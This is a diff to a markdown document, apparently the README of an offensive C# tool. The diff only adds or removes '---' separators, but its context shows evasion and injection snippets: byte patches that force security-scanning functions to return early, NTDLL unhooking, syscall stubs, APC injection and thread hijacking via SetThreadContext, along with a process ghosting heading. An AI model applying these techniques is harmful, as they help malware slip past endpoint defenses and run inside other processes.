@@ -103,6 +103,8 @@ graph LR
     C --> D[RET]
 ```
 
+---
+
 ```csharp
 byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; // mov eax,0x80070057; ret
 ```
@@ -120,6 +122,7 @@ flowchart TD
 ```csharp
 byte[] patch = { 0xC3 }; // ret
 ```
+---
 
 #### NTDLL Unhooking
 
@@ -140,6 +143,8 @@ sequenceDiagram
 ```csharp
 Marshal.Copy(cleanBytes, 0, hookedAddr, 0x20);
 ```
+
+---
 
 #### Syscall Implementation 
 ```mermaid
@@ -190,7 +195,6 @@ byte[] CreateSyscallStub(uint syscallId) {
 | Thread Hijacking  | Medium                | Low                    |
 | Process Ghosting  | High                  | Medium                 |
 
----
 
 **Pro Tip**
 Combine with -UnhookNTDLL for clean syscall execution environment
@@ -220,6 +224,8 @@ QueueUserAPC(allocAddr, hThread, IntPtr.Zero);
 ResumeThread(hThread);
 ```
 
+---
+
 #### 2 Thread Hijacking
 
 1. Enumerate and suspend a target thread.  
@@ -246,6 +252,8 @@ sequenceDiagram
 context.Rip = (ulong)allocAddr;
 SetThreadContext(hThread, ref context);
 ```
+
+---
 
 #### 3 Process Ghosting
 
